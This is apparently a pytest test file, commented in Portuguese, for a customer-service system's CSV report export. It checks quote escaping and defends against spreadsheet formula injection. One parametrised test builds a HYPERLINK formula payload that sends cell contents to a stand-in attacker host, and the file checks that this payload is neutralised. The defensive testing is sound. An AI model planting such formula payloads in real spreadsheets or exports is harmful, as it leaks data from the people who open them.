from dataclasses import replace
from datetime import UTC, datetime

import pytest

from sac.application.ports_reporting import ReportExportRow
from sac.infrastructure.csv_export import CSV_HEADER, csv_line, export_row_values


def _row() -> ReportExportRow:
    return ReportExportRow(
        number=7,
        brand="KODI",
        status="finalizado",
        priority="media",
        customer_name='Cliente "Especial"',
        customer_document="52998224725",
        customer_phone=None,
        customer_email=None,
        products="Alicate x2",
        defects="Oxidacao x2",
        solution="Troca, pelo mesmo item",
        channel=None,
        attendant="Ana",
        order_code=None,
        opened_at=datetime(2026, 7, 1, 12, 0, tzinfo=UTC),
        closed_at=None,
    )


def test_csv_line_escapa_aspas_e_virgulas() -> None:
    line = csv_line(export_row_values(_row()))
    assert '"Cliente ""Especial"""' in line
    assert '"Troca, pelo mesmo item"' in line
    assert line.endswith("\r\n")
    assert line.startswith("7,KODI,finalizado")


def test_header_e_valores_tem_mesmo_tamanho() -> None:
    assert len(CSV_HEADER) == len(export_row_values(_row()))


@pytest.mark.parametrize("prefixo", ["=", "+", "-", "@", "\t", "\r"])
def test_texto_que_o_excel_leria_como_formula_e_neutralizado(prefixo: str) -> None:
    """O export sai com BOM UTF-8 justamente para abrir no Excel, e todo campo de
    texto da linha vem de cadastro livre do tenant (nome de cliente, de produto,
    codigo de pedido). Sem neutralizar, um nome como
    `=HYPERLINK("http://atacante/x?d="&A1)` executa na maquina de quem abre o
    relatorio. A defesa e prefixar apostrofo: o Excel passa a tratar a celula
    como texto."""
    payload = f'{prefixo}HYPERLINK("http://atacante/x?d="&A1;"clique")'
    row = replace(_row(), customer_name=payload)

    valores = export_row_values(row)

    assert valores[4] == f"'{payload}"


@pytest.mark.parametrize("campo", ["brand", "products", "defects", "solution", "attendant"])
def test_neutralizacao_vale_para_todo_campo_de_texto_livre(campo: str) -> None:
    row = replace(_row(), **{campo: "=1+1"})

    assert "'=1+1" in export_row_values(row)


def test_texto_comum_nao_ganha_apostrofo() -> None:
    valores = export_row_values(_row())

    assert valores[4] == 'Cliente "Especial"'
    assert valores[1] == "KODI"
    # numero, status, prioridade e datas nao sao texto livre: nada a neutralizar.
    assert valores[0] == 7
    assert valores[2] == "finalizado"
    assert valores[14] == "2026-07-01 12:00"
